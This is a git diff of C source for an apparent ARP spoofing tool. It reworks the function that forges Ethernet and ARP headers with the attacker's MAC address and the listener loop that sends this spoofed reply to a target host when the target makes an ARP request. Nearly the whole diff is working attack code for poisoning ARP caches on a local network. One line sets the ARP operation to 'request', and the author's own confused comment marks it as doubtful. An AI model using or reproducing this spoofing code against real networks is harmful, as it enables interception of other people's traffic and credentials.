@@ -247,25 +247,27 @@ int check_args(int argc, char *argv[]) {
     return 0;
 }
 
-t_eth_packet create_arp_response_packet(void) {
-    t_eth_packet packet;
-    ft_bzero(&packet, sizeof(t_eth_packet));
+void create_arp_response_packet(unsigned char *buffer) {
 
-    // Copy from request packet to response
-    packet.ethernet_header = *global_data.ethernet_header;
-    packet.arp_packet = *global_data.arp_packet;
+    // Ethernet-header
+    t_ethernet_header *eth_header = (t_ethernet_header *)buffer;
 
-    // Hardcode destination and source's spoofed mac for ethernet header
-	ft_memcpy(packet.ethernet_header.h_dest, global_data.ethernet_header->h_source, ETH_ALEN);
-	ft_memcpy(packet.ethernet_header.h_source, global_data.source_mac, ETH_ALEN);
+    ft_memcpy(eth_header->dest_mac, global_data.target_mac, ETH_ALEN);      // Destination MAC address
+    ft_memcpy(eth_header->src_mac, global_data.source_mac, ETH_ALEN);       // Source MAC address
+    eth_header->ethertype = htons(ETH_P_ARP);					            // Protocol type (e.g. 0x0806 for ARP)
 
-    // Prepare destination and source for arp header
-	ft_memcpy(packet.arp_packet.arp_tha, packet.arp_packet.arp_sha, ETH_ALEN);
-	ft_memcpy(packet.arp_packet.arp_sha, global_data.source_mac, ETH_ALEN);
-	ft_memcpy(packet.arp_packet.arp_spa, packet.arp_packet.arp_tpa, INET4_LEN);
-	ft_memcpy(packet.arp_packet.arp_tpa, global_data.target_ip, INET4_LEN);
+    // ARP-header
+    t_arp_header *arp_header = (t_arp_header *)(buffer + sizeof(t_ethernet_header));
 
-    return packet;
+    arp_header->htype = htons(1);                                           // Ethernet
+    arp_header->ptype = htons(ETH_P_IP);                                    // IPv4
+    arp_header->hlen = 6;                                                   // Len MAC
+    arp_header->plen = 4;                                                   // Len IP-address
+    arp_header->operation = htons(1);                                       // ARP Request ???????????!!!!!!!!!!!
+    ft_memcpy(arp_header->sender_mac, global_data.source_mac, ETH_ALEN);    // Source MAC
+	ft_memcpy(arp_header->sender_ip, global_data.source_ip, INET4_LEN);     // Source IP
+    ft_memcpy(arp_header->target_mac, global_data.target_mac, ETH_ALEN);    //Destination MAC
+    ft_memcpy(arp_header->target_ip, global_data.target_ip, INET4_LEN);     // Destination IP
 }
 
 void start_arp_spoofing(void) {
@@ -289,52 +291,47 @@ void start_arp_spoofing(void) {
             exit(1);
         }
 
-        global_data.ethernet_header = (struct ethhdr*)buffer;
+        t_ethernet_header *eth_header = (t_ethernet_header *)buffer;
+        t_arp_header *arp_header = (t_arp_header *)(buffer + sizeof(t_ethernet_header));
 
-        // Check ARP
-        if (ntohs(global_data.ethernet_header->h_proto) == ETH_P_ARP) {
+        // Check ARP protocol and ARP-request option
+        if (ntohs(eth_header->ethertype) == ETH_P_ARP && ntohs(arp_header->operation) == 1) {
 
-            global_data.arp_packet = (struct ether_arp *)(buffer + sizeof(struct ethhdr));
-            global_data.arp_header = (struct arphdr*)global_data.arp_packet;
-
-            if (ntohs(global_data.arp_header->ar_pro) != ETH_P_IP) {
+            if (ntohs(arp_header->ptype) != ETH_P_IP) {
                 fprintf(stderr, "Error: IP address is not IPv4!\n");
                 close(global_data.sockfd);
                 exit(1);
 	    	}
 
-            // Check ARP-request
-            if (ntohs(global_data.arp_header->ar_op) == 1) {
-                unsigned char* sender_mac = global_data.arp_packet->arp_sha;
-                unsigned char* sender_ip = global_data.arp_packet->arp_spa;
+            unsigned char* sender_mac = arp_header->sender_mac;
+            unsigned char* sender_ip = arp_header->sender_ip;
 
-                if (ft_memcmp(sender_ip, global_data.target_ip, INET4_LEN) == 0 &&
-                    ft_memcmp(sender_mac, global_data.target_mac, ETH_ALEN) == 0) {
+            if (ft_memcmp(sender_ip, global_data.target_ip, INET4_LEN) == 0 &&
+                ft_memcmp(sender_mac, global_data.target_mac, ETH_ALEN) == 0) {
 
-                    if (global_data.f_verbo) {
-                        printf("New ARP request from target:\n\n");
-                        print_headers((const void *)buffer);
-                    }
-
-                    // ARP-reply preparation
-                    t_eth_packet packet = create_arp_response_packet();
-
-                    if (global_data.f_verbo) {
-                        printf("ARP spoofed reply to target:\n\n");
-                        print_headers((const void *)&packet);
-                    }
-
-                    if (sendto(global_data.sockfd, &packet, sizeof(t_eth_packet), 0,
-                        (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0) {
-                            fprintf(stderr, "Error: Sendto failed: %s\n", strerror(errno));
-                            close(global_data.sockfd);
-                            exit(1);
-                    }
-
-                    printf("ARP Reply sent\n");
-                    close(global_data.sockfd);
-                    break;
+                if (global_data.f_verbo) {
+                    printf("New ARP request from target:\n\n");
+                    print_headers(buffer);
                 }
+
+                // ARP-reply preparation
+                create_arp_response_packet(buffer);
+
+                if (global_data.f_verbo) {
+                    printf("ARP spoofed reply to target:\n\n");
+                    print_headers(buffer);
+                }
+
+                if (sendto(global_data.sockfd, &buffer, sizeof(t_ethernet_header) + sizeof(t_arp_header), 0,
+                    (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0) {
+                        fprintf(stderr, "Error: Sendto failed: %s\n", strerror(errno));
+                        close(global_data.sockfd);
+                        exit(1);
+                }
+
+                printf("ARP Reply sent\n");
+                close(global_data.sockfd);
+                break;
             }
         }
     }
